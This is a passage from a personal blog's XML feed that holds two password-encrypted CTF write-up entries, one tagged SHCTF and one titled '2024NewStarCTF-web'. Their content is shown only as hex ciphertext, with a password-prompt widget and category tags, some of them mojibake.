87a948965d8f837944a0402424e619caab69fb209dd11507fa886afecc7e237919dd9669ebff530b3327daafa7526df3bdebfcf8896c190885fc3ecf75c89cfefbe49b0d7565bf0cf6097feaecc406922a5e2233344bfd518144c8373c2fc141279b9f486d98874837a155ec1b06418ec436262ac9bcc6a57a8105327655a2327115c4770f2d9c770c2c900e830eb8e9bc4d44c013400f4ed67628c297a612da9907273c661d831f955b57ed0b18a16775912253989ce445d7596e5f98c43ff2e91ba4e320f30e34a0638522fdb3e5f597355c3e7b044eb729d0e9369d30bb6978734a9d8eaed2417e331c78bc99092647e5abbe2dbd0dbcc7b102a0bf1fac2a56b07182d1e4e597688c0f47f515959d3f40ae0a2ef53a7eeefffd5c0203c8692e2b6615ddf151e9e14bb002e6d9c4e6031a3e7038fbb4c0f41e5ab61c54ecfac16c7c902180f6fd675b2fc1f39a8b27886a696426080c6db9cb5a5d0c3e2fdbf275c8abf76d7207b30e84e7b5c432f854174fa9287a68e8e159d6dfc565abcbd992319a96b80104e477d12ab5f8603f3a7f39dc7a4f7c8d8fafea70e6b6e3b0128ea84803773fc67cf54e9e8e9864eaf939b228e9fa19d2b230e2bdbdc16751c42b8f3e8dc0236156135c8ed609d4541eacd67496c386c121ec7828279fddbdace157194d195741ce3200555254e0d071e5dc9d79bf9e836101a690972b61f75ad4ebd9a29c9ce87d8e7a9e4aab8a2eea2a59d48c35d50b655ae39562aefb433a5e3232007615fccbc053b32fa7e07fa5cc36a4fce7108c26dfd45589bfdd0e7e24af29d0c9b4b381e5f4a98124d892266363203f501221466648b7c20f99854abc4b376fbea5afc105664b3a67a8a0df8adf83444a27cd50d7a91e4ac340865edb47291d5f6a8d782c96514af3ba6ae5569cdeac13e8c7d1f429186d6931edf9cace786d4ad687b67c8c8ae08b196a574008b9f565d163ba65cfdd68335851eed1c59778aebbcdec2dbccd7a5eaf9c617d540468222f58771fcf1987b65aabdfdd24687caa216b7beb0b381b744c8f8705dd9e9998284fb2f8c4d8f82a467ab07b5bea35ab4a61f33ad5aee2f7d99925296aa6c6c5fbc54f14c4766137be17385ed4133085be9464fc95f4796ab660d7336597e3a8a1132771e3e72b2786e70afbd5c6bb6c23cb4b0367a36bfdf7ded4d631ab3ec611eb0468362806e5ea6a9cb8932dc663c0055f99af213ae03e04fb65c082d4a48be2a0991c4b6ab662f3cdcce20afe6b335b6410dc98732e63189499f9d6ee31876a1b857e3ad2c6fafb6328ba7b15185973548d8cf4c71d1c81bc4df0eb649d521adc7249bbe1a67c291f70bc7c97d2d5448606f576bd62c4eb7b7aeb151b70f828d98310b1b97ed79c4d02c6e73b716c7557ff6f37ca680314386d9563feca94f6f6504bac8201e156affab6421e45d26a8913e2e68c30974c73af7c01b7f312d131aebd9c4873cd68615444e2d2698c8bdea1143e44402c62e078811c1a768d1da67e53720e7e0e7472f360af11db2869a7079a972a9c6c0d9e0a030343609a9338833964691e72cda01916b9fa01d82eeb74d59519bf4da6e6298c0cd575fbad77387783488e928ba2ebd0ffc800985ea38bb418fc8bfb4819918eacc72e53484471b826f8a27494be676a37d26145568b6bdc59912d5569793b63c08f2dd2591f8e9302a26ccb36dc2700f485a1f1511a7d72111ef3ce11fb1f125ab67270960f26c1c8132c27255ade4762e05178456104ca9599f312a27186c2c7d102518f0c1cee0f49b6b59b7c1b0c4f69245acc2f59eacb080e87bef02b910043d9deaa1ec8612ca3eed1d118976a8d4dc144c68898a30bdcc84d6ec7c467cabbebb4f562f97a3d7c06b4430e82910d9fd6d02ffbc3ff8df726438db88a043e142091ab41484748becb216634b1a03c15b8ae2884269119f1922ee7780d097f9ebe0e91cdfd2c7663501d239d61718ec62bd72faae3090a56e5a74921a3594837ce68e28cc496fef5710314d6dbf715186f4c3046292c47fc484e761edec194497593a2b0793f8c4bf65970c1a866ce9ef0e6183505164f2432f241872e9caf9e9fe9fe805fa290992235534438ec1eff864d62cb265b5819fd2e292ed8a6b456caa75821b890dcc5b3585ab654408ed57108ffae4f8560c636d817e6d95fb939b2abb73a0145d27f1afd443724fa0c2a0147a170e9c075c4da13693b7658137728f683766a2a40df5c662f715f1268c8eb8c9756d2d2c4f6c494de0ff7195c29e595fc927e4e8c51a95fec2503b047c85f60c679bcee3c811adf59b344c2ce60de328720f2e5c3f8409851341cb01d2e5e6b5800c99b1defb753a77df37bf466a4ed35498f74643117d5b6abd34fc862384bbb662956583266dc32d53f84d8d2c6452f19f99cc37f85881d6ab219db358845e8f96f9f72ab83a30837a8674041d688b1de35a0c57a3bd9867a0e4e4dd306bbe5dc5233d6d4977db6a42345a53adaf18e3621fe96875a3eefe4b1e4cecca1349bde3206910c13df2f691dd59fc10e81b5937ad55cf6a31bac3295f4ad90a6ff35864295d73aff81e56da8d065ba91bb85fd0915b2f1a2b12231ef3a45b68799c1ee15db2e720211fff3ae19dde8496bb32fdb9bf694faa1796242a4db404636ea416ebddfc33c1c15f56ef592260b59bb6c738ac4ceac320e73a7dc9e5a03c2331c124da1c776e18219858605092d0951fb91dfeeae1912b6e6323efa74134da8c06c1add30c9bdf763bf816453fd5745ed33bba8edc310f997161d88beb5a0c63980af0fa2bc8de6de3d8848b6524250c2aa2be4ac8b76be201756ba95317d24c30541996df510b951cedaf5d8fb226ebb4cd5dce22aa7d183b74f176b1ef63aaf5e9d480b98db6ba9b041c81e8450e389aeab10cb18148dc494e42e3b42c5518c6cb350018f1882c35d82d11f52348d385608046fff20db084e5394b0b47738cb0e1b39b46760c91de0b6d8f564e552af846a4154aab1442f1dab0d9cf270165a6a07f98768fa121e1906a589f10497cd5630058cc2246820a07409387afb3cabdc4f60c9f48b623c9622b57de7607bd25ef60fa0df82757a52834ed05c8598f56c9b2f0aca8c6499cea93ed19ceaf67ceebacc51be0baaa0e6328aa728c980de1039e1e51e985851e0bbabfcd71bcda2f0de5ffe2d4f0d9687a29b34bf7582db2567fb55b9ef8772c7afcc5ee38c7df685278295ff1230c711ae3368f5a239e4955815e1632e57991fc3a6a4d4bbce1f2a7856ef7bf61ad835a7edbff96a28ea91250d49aacec638a21d6cef9eb4ea7d138962b885080ee3db5acfeac7e6319da1b312af094a3e472a3f7c60be8adab2f8f54b809e2382d2d81d522e61a545f6d000f7307a565852d6eaac42adc5559bc5e7a86d4b608606a3a479ac7f66579d75fff681e7f7f1efc86e43f7d55788ff66109565ff5e37a5e0b153bff82b2523cb26e3ce1f8e1f1de4c24d5b73f06db18c7e91c2e9a470ef393565cf626a07c10bf19bbbae520bdaffa09cd690eb68f4eda9c4b645741aff26afeb4b332ecf16a9638f0862bd26fd780c468086b571766a519a11479e6e58330211f05c40dcb2776e98c037aabadaf993fc5e12d05209790b2e035b88c0687808f9c8abcce8de66da016cc0a985e911db05447389ec6a9e6fbd33bf3075d6ac567055ac692309c687bca2de76ef5d514b88955cf6b1e18c105e4684911de8037600e511717c6f5a548e2b292fcc636f77ad2e304a43b0445a2823e36f6e84ee3f20a8566571116d292f336fab751cfba924c5634fc606e4e41e3866546e23317b916da4c824e63ce16c08142510ce516b2144e260535b7bc943214b65f10accaefd635356c5875eb4ba6347994289f85a57517ba412b81e051a857e9830397306e5770e6126201dcbe6ff8e0dca707a1810e34e341f9c37398167607d59c38fe8ea3b055ebebf90d4adcbf37a7e28ffd0d835a434623d4426d39a44297895f79a3a66f7ba1a6ef63ee5416dc1396440a94864da91d329621e6ffc6d32c02191f13d1b747dae8914c6749a3694c516abd7a90a4a95036d0c9aa96aeb718d32dd20e6f47399934318cc56ad52a965847a3b46c0d271e90c85ad0a4ef9522edeb1e8a1aa8f2f18e5449e9480889f8c4fc3d27e0924aa6d2591b692f5c060fdd50a9e4498085033bb8974ca4beb39a4aa804c8d7a6926b3d6d92da92af904eecaff5d887f3ac0f23844a54cd6eedb0c0204eaad596a1244c61821c3766eac49e2e69e1c041375316505f73e68f748e86461050c039bcab4140144b70dab362a21902a6f7ff76a1ee6f2e54dddccfccbd3efc6322caaf29b6e29ae9775cd951bb72ef3c7a8c7160dd3c12d292ffc2785c83e59e8950bcb08c8fe4e15f7dd081610fbe454995301777ec761d98b6a1d71638e11b023cceda04d1ef1a7eaa52306dbb00f5ccb8cab713d8e8a20d2c06135b0231f2abbd1c8137cf72ddeb997eeea6b8189f54aefc05d427e8f4fc8b8f7c9fcd90c399c27bae4a8d69bb72b50b4ab84c1fc3b0eeca6ab81d13557c487ff7741fecfaedf8ab87f6e27011230e7c6a961abe9ac96923720436299d637211967dfa0dd9bcaaa5ae7fb264123fa175579022bf5173e5c02a9fd589f13c8b476de403ee3708d8cce13cc653c836c82e2c9b2d0c62d2801db3c60f982ce0ee93e988b9c0135f3ec87839a48bdf46db00acc424b43fe0cffc10e68f7dae253cd9cd144669c4edc111cec08fb5e3aec1db8fa4f839b5b7ee6986d275f47a199bb2a5b0fd8edd8ee877dc8c280767907a7dbd0f11f66db86056567d08d333aff2f689dd2c0913399667c84721fd361ec24b5812fe6ba349759cc3164a5a303f46c8b5cc8c91afe028b8f1c9a295c8745ce8fb56cc2ca7bf5c72cb88fd0902cbbe7192a1da3a56bbcc3502ab8f1dfd32953071a04e7d11640a5c81b00c2dbd944fc36651cf80987a10a54ee487b77dcd3edec90819d85f457c85f8c01bfc26bc9007f2a534baeeef340e5365ed4b4db8b01a7c02faaecd84a3b7e55eab8fccbac328116f59abcce0bfb191687757aa6c6aee0c75d48c66e3c6d4e861303578b3695575d6872b1fc2c5314cdee7ae7462295921fa20b2b009e8cd6cf0e44021b0faf1533cc99f6ea816f530050803a28a33027377049a682b4c281297e707005cf9a24ec727cf5c07a4b31c32b0bf3e781205029a46618db6dfca1d3315b44e438704229337285f39d93b3af2fadfa445d8e29ca98169fc098b4ca7fe223b2fad28a7781e798cf318551db3925e53ed136f12ce551fa094dc5a0d7d629be8f8f75fc801bf1aa395ecb733fa84d3b6933e13d26ada2ce413099dbc6d666ae5b573d52561e8bb85a1867bddac1f92ed8e4b37147ea0be1bf1bb866e803baa359c0b02498862fae4e3d30bc983edfacd57e00f79c14e7242299326a7b7a4f9517ace887b2d59ab65a1140d3d6f5bd71c0ae0d1f99e998c6f57fec5e29ce4468857cc9008183f2436ce4b70fa3f432a16e59b61921a2a12c0f119a4ccc223483267fdb3944cf876c3becb502c6356d347c14402ef2125af889b053fe9599acf2e4c2dc41f3bd904d3ad4bf8ecae0dce22a63b018828199ce69c829cfb0513a17190a170c6bf41362e1c68a12b414e0e839a7b59c09e4cdce2643851ea4f169a31594a6cf80be3e1d6ce5b648f587eae80c663dfeb3ef28cbef93d046211b12ee81b1de974b4d50674592f3aee0055997950a28d38000d26a4f80de89bb3aee2be87fc5795444e9f36146f6eeb97b9532231a5731737750c100e640173858ce18f2d30134165f5de64cf7640e6dcf0d19b167803eb0882e44b85872374e708954397099ac49fa912de30df483d6ecf5b803b32b07a7d13b18e2e134ed06f0a9b88f787876e9c812ceb5ffd23bd7e3a7b60700a9467401fde36e4e38e2cb2e03f8b4f0f6ff05e9f6387c2670d4438ff99a9d3e36a428f58906e3c9d0b5484451e461da5f7a8bd23fac39a6805c6fc54bc07e14f889c675be4bc614f81a5c0df54c5a45a9f292f647496e67dae9f776988e8dfe47caf5972c89c61eb42205063d9af36f922092aac42b8502178a222ac91013dc5a5bf96e1f3d89de8f14d9b7bf5319cda2ffee8f83e5f65550cd8687c45405467d6c1e07c4469949679090bae72e672e26ebf88dbaa6373c9987ba7480eabfe74b8f893e251f4a09ce42b71a11fcc0719f2cd44b86f6b7f2061964a3b3b869350ecea0c7aaffdec46809a0f46ce0b64ce89d48b6fb03d42febe5e22acac00e4eb99a873dbad3d46a93a01f015b23a7ae632daedd8cd95be82a5a9d3d575a549cd7b399d1bd07a954c529100c907a479537a5a2a9926f0190a3444573182a50e38a87ccb2896f08d35c6c03ccf11195e4e2d893085ffa7c9ad57552ac37c7762030392cc19648cb200e7b25d99e9596f30c22dd3e02bcef54e95e5d2ef38bdba3b87fbcf0a242cc2dfc1ece1d1c18a037e32940cad15f348efdf558ee9ac4cb138242c10aedd3f6eb21544a606340a0e9c3c6fa8c85537e6c61853e369a1ce4d9f8f94afcb9f5049ae98a529a5fff2fdbe3787786d161d0e32952ff33a86a60a010aab2d4b7012c86a58293aa84442d1dec5521eee6628412cc0aff692c723a8e3177ed5df91b37e176ccdc47f5ed8a506948a0ed91797ae517118b8a2e0bb4104639b0970b54f5f4fa71ed9287444f5a45245dd58b928e887f9343ccc69abd17ade8258c75916bfa333b4a395d3bcfe7c93144e09b73915d8cdbbdd5256e6217d53a6d1b6b3dee43333db564aaf74856198803cb9bde2abf6220e88286bb1e3a4744315148a5ab44785b40e84ae8156ea5fd89a4d207fd94945a941450d7680ce792245d2cd598c41338fceb025d01e2c9fdf4d7b354fcec694309ca01b2297e627cc2dffdbb58537c805b8c2a7e5f21b763d37cba4292b1b8c2d92c3f2a704911ca2a8417fc337c4f03e8017c322f4c961b8d3ed7bee2adb8b1f829e08d624911137e4fcf28a59c04376d1515bdea7d6b7f1fc733db391156e2add05d30285f05a05893854a16ceaa3289c1df53553daf3e7ab7368fc37a9254cee27fc8d27d1989152fae09ef0ed4b0093eb7f2eb9f6ba5b661fceb6752b202fe817199c8e4a0d7b30493cc6e90d8e33bffe28543d4454cb5d89c3750abfde9fa954a4c22e0b0fcf58ba537999c56cee904b8b670f314f7623c2aaab405cb29ad2698c8b0836f1b2484dc8acb20d63c5c5a47cd08c1ffc1837146c1a17acad33f0c53901f1e867f5c97b7cc94a660cca13993766e8d21fe36f0bba673184932caee7996cbeeb7bb559d1930ad24c910f8bea86a4623920d83fb29cc01bc05ea8d1cd0a385478ad996d325e22c68b703668e9df0136552f8fde45cac419af7f7524cb8b4dbea944bb7d40ca1d37930535bbd6f9dd22d26a2d48ad067baac3e3fc164df1a78140a5723c0dd0f86ecd6e7abf484b74b6058b28a1aeb7336fa19edc5f40f38873a26282d60cc10a69ad4fc8f39de591b2bf676c900b422606405d0fdab9a3eb0ccd5e3a94fe07b73a9dbc87bb77765ebed27592ad40b0c920138dcc352fcb7136da9c7c34a69ddfad57a4df3dfee7428c85653745696f8f88e10810e3a9d831280ba9ede035eee4145fd40e06488e4490acc5b3239cbacf26cc477d07c12cc7da14067459f9d153b56680a3aa111a9ba2ff2cbfa3f8cc81589f1612a95eb8c812e1ca3cec4b2dd44b626788756a6b11a998c6261964e9b13045086e5f6cc31154abe249c8cb65bd96c7f1b18f4388edde0df6abbca387c9df0bcec80d6fd311f78ada194dd79126f6728c6168cc62f296ab8eb48ec4b322c3fb3a29a8db5a9bb6b0bad863c676e316617a29f8019b2617771fe0ae06dede909523560ed3740e20e108a455ca67d47ad657bd961a1fe20ad2186b35a859fb05d1818f0d4ee19df6cc4e8b961838a20346e5a50bc32413446a4597e67e4d9dfca5b5b7681fe5bfb8d1e987496eea7e62090493d919ee72eb9ed1f86492d7480c3ad5acb2341133140810e8ed536d407ab871fc0c195b5fde006e64ecd7779ed19a9ce06e6cebc1dcfce1f3f42c19a71136593b24992d24c1097bbbd86cffa54d479c6849fe7aae7bb7bcc7f4ed59e293eeac4c5821cbce7426e1c13cf1fb6118170da31a8c6372255f818638fd4bcff2b8290fb731773baa95df8772e952ddea9f571397add895b4be5bdcbbf59d2c0c1633bfea0826574dfce7ed0d50d57a7cd13c657037f3b47473701ebfa2aab798a526da9c223384eaa8e9bf0faa7cae435eeebafe0e0985114065ee63eae316cd61d3d57810641ae47dcf75332d0f53acad5fc988d86865b10c9b6e2d1d9b0486e4a555eb997a5cdd72b703410b473f1a5391d72c2cad8b66ac6712502c3d29315a4249b2741eca70d7056493aafcc204bb8dfbcfb266695f933d1804724e89b4226820da0278ab6b89961e9f8d013e92f7c2e381251f645e957ce4f7be1755176696d6ee809fae979557439fc2b20bd87bbc1360d469e50e83440c97f48a8433366c8409113365bd985a1fbe08396af0ab54a61edd1b70a91b3282f0c7c2248d7026445a087c6459630e9f5f90ddc604c4594b94ae16f473dfea7429497014e7ad3f450c6191f3d2f0508b1a9ab7182bb4bba6ef9ea4ade88b59b83b1e8b8a18521b22ed6b405990f80b13ee01c1b74a7f48783848647e41cd4febd411f689a67e183ea1ed3399a1f89ba9a1237261c3492484881140db44f2e11863f76a11d21f6323259c70d6fd55b31c52311f199a3a3aa320e691e7630aabe7c6a235a9649fc1676c515fb2caff74f2dd20b1826c5aa5652420f4cebbda9135b4eee728b1d2c043fae77bfd47fb04685be5dc8900723a91848909d4f99eac8c7c054af518c3634079d3f4a3c737ed07a44206948a36e40707e907789e72ba1ff37602b7476e25ad5f317c19c394555d4ba357a932f0a03ca9f4ffd443e8205a7263bcb6196bd76ed8a6775c02cdcf3bc6a1d7114aff57aa3c8f461ae2bed6c9ef3b601f282f686b7947288949ce1cffc3e001af53ffd331146b85f7c21ebd507a7851caeb975b5a0611387444c0c45a600c516fd745d625e5598a9c8493247c3ab4633cc8b23a0527c6e159dc4fb2f5c969201264cd01df723e0954b88beb351bd80cb12a32bc2e28194c87a6ddbfc9c500634efb03bfae82f105b212a34d53ad5a40e6fe095825f0fcf22d404907ba5de05a989a2337aecd8d987201fc902da32ae81105cafd1eb7b33f9bcd6fae9398916ddc7a23e0dd7f17714de35b54b26a9ef8591fc8c245eebd4bb08595b77cd7a5819c56f185ab37ad5b19781ecb63cf22177ca5682afbb2974851221b0cd9c61c0b253dddb9157477720df60b5d7ff614d97630be2007ab2388191852da0e2811c1bdd189392a2c68f88a3f0bc2dd521c480006c81c4b72edd5e2b2325a6dae701354db9cef5ab4012ae6bbb978e221048a6c068d6bfd6b80ff1a3a2225f5487145615cb271e130e215ef0526bfda9cbf2cc4f1c78aa4a810b13d2ec53fdd61c9754c4066d0dcf0a09da0a435ec9309a3a204910ba9d3a5724d33ca3acbbab3108f040736d4fa651520ebaf6a63674878fa1f4363df59c86033db59e635a52f4cef15cfbbf8b625d532d98f0fccf8cbdf8ea75dcd5381736c58cb0ad4613f812b500eb65b43deffcab9f11d74206e934270bd5cd07b059ae5a4a6afc266348808026448fdc35cd9b2518a69a95ed8dc7cba807d70b57799739c1540b9586364361f8ce3d4f467c63b83311a83768efe7a5f286d82372b762b33fe777573abea1a7b7b2d90d631462c06836e1358aa5199d0bddac9524a7bd2858b16064f56d0bee512b524f4475321e472bda11f15bc74ce11a1c5822179d49819667ec02b0873fa24c13b30f0e4dc07e62bec1a4f9e4fdffebd132f8a5e02c9363afcb9a246290237af2df5acfc2b0666f9815c56501c8c186b12935d19d5b028e17f802d5516ddbc10645e79f96df0abfe2b01def52e28766a289bfe6ab5de2f0f5bea9a95f53d93175ad4c4972579be406d0c864a83e94346ddb2ecaf62f47dfd4474479efa55b1f37193233e3f4d35119bb97e911192f36786dcd2a67341752645f3f3ce02bdaa5318d48d9d951e08f553056d629d64c36b91bc343f305f558fa53e1b70dac44e0c52a1a5d12e8c6ea5c8570bb48afc4439a8e1e908b81cb9aa4b37b92b17bbba0e22fcea55c279b63336b5e237da089bb2d01bc5c350172039393389014997096b7a197101db68de684d4c21808bc49b0ea91783c3e1c83ec64060c752ee8e228d20eaf7443cc71fa2b49573e69711ccf140a3a9955903c448601f857243e72af2ca273bd842572c68e199914b708a2e93f3a6c8c3dadbfc8a96b45726c96709b1c9628ef4631da8863f6f1a0ce8be5e59fc465e85152f910a174ac15333cef3b163ac8cfd094d6afd69229280e29cf6dc590d44eee12d45d52461f6a2c0b768e05ccaa4931dffbdc76884ae247ed7da7c53a6c0be54c5869051e9964f6729d10beea2072df80a0d2ea8e15d0d4b5e34fd09bebc1c5ef042f7d27d7750bdbacf394885dfbf90886861a4fd7ab7e94b1dd72f44fb65dd0b53aa1e6a7fc1e9c066dff2476360d3b7df3eb8a2030906dbb2b15ce20d8cc6010e41aba55e20e4ebbb208c00c12ae7d8ca8ac0b89a877b546f1c22aba9027aacf44c309e586178a1a8cdf96ecdf2956ecf824a32f91cadb16a3f8ae79d1545427de57906257e3723bec8c1d7c3de44fd7c39905daa2a378d4d05b7ed03c5bc35ee1a98e521119ba26bd37e4a86ebd0c2fc085dfaaf745d125f979fb4d5cd9a4ae2aebae2a8f4a547840327f7eaf0d89a9c3ade8d9d909af02f3779d9a458e95655dbc954bd750f5804b078af2567cac8b916352a13fedfecf8ece9c54bcb671f6041989cec92aeb03d390ec87cbdb39adbdcb305548ccce123a6402446ce240ed1def323373443dbcf12305a3ea7d3535327311d6da6bab744537e2dd3cb7d0f243c29172d3174c9144546f8290b94bd4c74de5ceb5a9dfa77fab41e48093925fcee2ea4e43e09fa7a0c90a37c7414aaea7d3fd846d0750dae7ed6098aff34089ae48d94fb5cb7b0f9a402a31f90d453111de49acb68806351f4b3cb4995b106dcb9f0f60fd1217fc345c5354dd5129498f0010dae48b821ade22ed3d460b7db314b627de50c6c6c758372b05f4b92502e52ebf174545f351796b711f44368b58ab6630282cc7be8377b11f2c486c01403be9c893feae73b880ec374e3e2ce1352c7b7a4a85e45ae473bb6d588ecf3833e508ed6bae8c47e3f93caeb06915edbdfef2b693522670c6daf055e579fc314171236d5d8e32660b4374cb28cdd92e611a736140fc53feef6676a65a9b8177415dfb365704ecc5329429799cef3d932b73a006298ed7ef9118b1650ea87404bc171a95351a4d9c6756bdcfed7db91f7e8e75871438048562ac66382078fb4dcabf4d35722701462034bc85b2a69fa109b28f97d3aae8d4bcb384220f868bf0ba86f84870a292b94b068b450cc01a4f9cb2e63f2520fbd47a9de805fa515fe0f24cb148e8c8b8fee02b02f8d99a2dd757ff6ff5398c3bd5b9882553c9e5f253efd19fb6fb313480b31c4526712ca1cc5a711de1d26395c7cdd9bc67329be8f261627d9587ea6cab8575989683f534c2ae9bf3a6cd0efb3f1580877b01ec2a1af794ef85a807aeab01bf9f2ce65143b2f41aea14832386087e3133b4a0e1914dd5c13514236a3c14897f439b716ac4bebb8393a42fa3434f38097d837466f747fcbbf84dd1a7b450843c47278dd23f647a9dad8156939b4b0f06c2876f8c4061aa2faa654cf9ecd97b8adf1a7cc6346e76e55cde739ef70b8ca004bdd00a4f46c8b134803e5eeef60b54b79cf27200c7a68ebea771e96ac78ba78b1c24f999dc9ac344da8a9954732c01336dfb1b3d3359c307c50a0c59027760c3ab5c797ac47d2d670b54fc9201047ea20dd2826fb4ae9c036de0e9fcee273be9db837ce22c801ae21dfe53d8b26cd4d33dd264a3da062b810b5d1e9561bc2e92e454bacd4c76b7f3fe5de4e76358f14a02085c602aafeb0216f536a3a105d89e2d489e66bf06703b00bc80b90b06eac915dc575716d861c916fff521575ea818edb5ae2c2da0e4bd1db88b41f0f01aa819c0087af68c85322c22ec3188aad9ab66ab3527203a14c84f006ee50f7c464f940be356e934423de6952a4e10d624cf24f21c50da71a34a65649da5f2317e697f0564712be1c960c43699bf27618d5e2b21b8a48fbd765f82d8f46a1fdb877b8d7e52438edb6466bafbd4c30928431fc154544addefbefd5852d4ebfc589775e7d38a9aeb704c7af5a474e31ecae182b633c25d6e6a34ba37ae54cf26d31f4d8ef414bbfcfe0ae1b1e0d5c68322a11e1feb48d791ecb900acb32920c7b8d1cd1aa6c90cfa344a6e312b92337cd70de72afb851c48054be2b6441000bbcd330c190220870eb7e978f4fccdc4779ff0f3eb3fcfcf900ee1d6a2b49db13e9259960a8c4be2b0e5015244a3ea3d504e60376e61d33494a28a59aa406b42247994b2d299e6942151650593ff4924877a5f12251858a9ae33eb64389db6774272ae1a59fe6268c312930c8f16ea78113b6fb850307af7af076abd4d87862384ac83a42d72ef6a5d3a2504b1e050ffa47ba0665a843e6ed6f546790f8b03cf3804b244b730aa6a6444535c13bcf86655dce904c21a6cee49dd884af77df130d01acbba39626c85b4b6ef9c7dac5af803853b18009ce32a4d0b4d61d633a596d0aad488eda071da289316302e82c4468e06d516769a5ef07941059c5cdf0d795b05694aadc7ba5ae2481a5ad84831349d8b9d493e5892b83553c0b25398a350beda6352dd3d2f85037a705a915bff214b546b17373d4d2d4d7df435773c72d467a4d0cc15e999c7be79effd6aa07b8309ef0f4f2b1d0a86ddf68e6b7289c8b8da7cb81f0c0e5d21b523cd75ac8a171126b109c8d9a7c8bc6e86dd58806cca1f44c8d152024b300566872a4caf73f9271e51e7a053fc3e90a10a064775d53ee74b49e5d8b1fe2af425e008a5a1b6607a91af26c1485f4597246925edeab50565af2b3be74ea314db3b8d99b6a956c3dd7a7e5e329477f11644ad61ef3c13f58234e17b6ebe4f72e4958d5b334abc2d5807b6580c247326aab9a790990996302c5b57cfef7810a4f79e9c30cea67fd863705034823a4e378d22773d0139d9aa66fab445c744c2a90d12a6cdd73476d7c1b8365884aa1ccbd9f6ba0db3cc8120336e73d6c7b76aa9ba7e9ec1d8dde1ccbbcbfa9554efd552ecb8e134cf7e2bb513f6f10392a1d724bdbd73728ecb3ce653b9d84d711fa8c323dfe69ab614a6827a9742626b7f02a0c04ae9ffa043648d223251196c220470e5f77239b1d5cd2de8e1c0101fbdba65fa33b26ce939a557a10b615d0918022c366017d4c564dea58f5853b060f6011bb4f89d949abbad8b2943145c2e239c83bd4a36cc7c506beff8fbb4dc9fe415ac0ea0aa50bf5f0f0ad2066208bed8ce66f0ffd3f1ca58b1c61d11ec38c52d5ee0e79b65ea801696db85d9f7b987d3d35ab4c49526f84946b17da98d9351721a55ea6711a258244e677c366fea2e8bbd075ac272dbc324b9fee53bf01505a5d1cecdd4faa2cdad0926bb155ba030501ebcc17e0404f036534fa4c543f158d4e779b3d1febc11cc08f0d183768a2df913a55209b0793ccd39f7f8d8c75d637036c9ddddd3e940f34afda312cbd14cd3fdbce1ef496bef4560f0379985dc2a4dbfee50942b13c8bbde135d1dc4375afc0fb7ecdc2f46b3d34918e65c07272af3bcd7e9d00a8c1b5efccfad270ac663a5fe1e32cb903870a62d98b324e27a7dcf49f9e2f7dce6b414759d33506c396a7e6e3f60e20554c9b40ead9a752ca89540120b606a235a88e9843876b3c9f1d90b4f8ec600f7993c6d14048c6860a1bd9746a15c3874183d33a805a192c576ad0f5d97002f8f062e11563dd6159e9c451d80699e94127259e0eefd904fb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SHCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024NewStarCTF-web</title>
      <link href="/2024/10/01/2024NewStarCTF/"/>
      <url>/2024/10/01/2024NewStarCTF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3f6a1f2fad36f01fdac98e260403264e6748383df95167593d9d68de315b7c0b">a1d64e06b6ec7d31335bdc9dd4afd69a52593fe7d4db0c8bad8fa144c8ab8a1fd790397f9db6251ffacf96ad115e8620240061c5e75c0f694c7943d0e9e25e94d9c283c13a2269c2b79bdcabfa71909a3a855739ffdfed8f99535fc93789987c37235680050a7bd69424e94cf719ea2d88f278fc7b7300e8b33c5b7f26a4cc079fd36a067316c2dc0dbe6422c39330371808c13493c775bad23e691d5fdd12fc51fb3027bc0d25e032e46422df9da3c42d8751c16215a7bfa11fba49a0d03369dc2eab5e6bf6ce5203fe800229ed2f28c4f2112ea77dc8953d5c8da505903b2c4fd0951cf6e0d9afc9d114b1a2eb0cbc0ca817b7ec55d2a30c5bccf171a837bba681a258aa5dad22a625b9a64459a518e9dcf620741ff661cf56857f021efdedc9bb3d47ec7d40ab15c8044f8e0e420711de082320bdd743e5a00d38244ba10cc4c867abe88233523192b5acb84ed081b4b078e650e2370a58a04d78c8668cb5bc6925f9f7949d2f698ece0fbf2e333d6d0cd63b6d6ea488faeb768e83e7160d44ba0fa07334ca3c46caa649f47ca032a511358f92f336afb84a85c22bd8f78cfa2d52b0392ffe0f55cebecfd71847720bb4486aeb9429deaebd2c251bc776fe0982b171fec60a2709031b6fb4de2252a50a672307545c74d6c98085b91d5d6a5da84a2c7d38d826cc62ffff1e446e2bebcc841c5ef5cfa3d5c75bade572d878cd56fa1bb1742eb49cbb0dd6774112f7e15170490a3ed6d11d615d7970e4ae898042574a0f237cf135eed9ca9110fc2cf3cd16b50f6fe453a37c1b8720d178a656360a0cd7487316ebfd3a9f3e670512dae2f9fd6a401b993857b397f24908b9fdc1900fe2ea8611ae432dc1557ef875c50dd604dfa235d972b1c4d7bbc18379a71f94e9ce844a7c744d725eb742627ff51814603ce11edde8d401f91087e8a7734cd3cd179044c13115618d9efd599857eb9a27f58faf90b0d2183d39473081e4317df6a300c6b0b04e6b859c03d278e18b30ddf2a2b2a7b6e64f4ec35ca6076b8d4d1caa7162f70e21ec1c24656e296f6a794f729d5f7c01eed880d3e921bd4579208311ea577b0e7a26526388b290241a936ccc394a5377cb0112d4bae37205bf4fe30621451adf9b2b30d986376c192125e8619bbb7d9339a007c035fee1a0980179cbe3a71b1bd50570eed9b39d7e356bb8fb0d3057bbccf5da7adacef225c9a92c2db1e41ebaa5621fc9a86e7700c6bee21bde68d436c82753893b73d6575d3b1849733ffddfeea8c74fb8e5c39699bc778989aed29f6fd866d49bebc935230f517ea4dd74eafa130c96acb428ebbde11e4afef9089e725ecab3046dec0d51c8750ecd6bf88626d73beb1fd4f223f7268b7fabfc899b6d5d2f4083c6cbc550091f90824fa1207403d5c168b51f3c867992f061fdb9ccb1cf6feb22c4f86ea957b53b